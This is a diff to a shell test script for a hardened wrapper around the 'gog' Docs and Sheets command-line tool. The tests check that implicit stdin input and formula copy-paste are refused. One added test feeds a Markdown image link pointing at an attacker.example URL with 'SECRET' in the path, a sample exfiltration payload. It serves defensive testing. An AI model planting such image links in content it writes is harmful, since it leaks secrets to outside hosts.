@@ -86,6 +86,13 @@ for cmd in "docs write d1 --markdown --append --text hi![x](https://example.com/
 done
 echo 'a ![x](https://example.com/a.png)' | docker run --rm -i --network none "$image" gog docs insert d1 --markdown --file - 2>&1 \
   | grep -q "image markup" || fail "image markup accepted on stdin"
+# gog would read stdin itself when no content is given; the wrapper doesn't pass it on.
+out=$(printf '%s' '![x](https://attacker.example/SECRET)' | docker run --rm -i --network none "$image" gog -n docs insert d1 --markdown 2>&1 || true)
+echo "$out" | grep -q "no content provided" || fail "implicit stdin reached gog: $out"
+echo "$out" | grep -qE "Dry run|attacker" && fail "implicit stdin content used: $out"
+# sheets copy-paste can propagate formulas.
+gog sheets copy-paste s1 A1:B2 C1 --type FORMULA | grep -q "is not enabled" || fail "copy-paste not refused"
+gog sheets copy-paste s1 A1:B2 C1 | grep -q "is not enabled" || fail "copy-paste (default type) not refused"
 for cmd in "docs write d1 --markdown --append --file plain.md" "docs create t --file plain.md"; do
   gogv -n $cmd | grep -q "Dry run" || fail "plain Markdown refused: $cmd"
 done
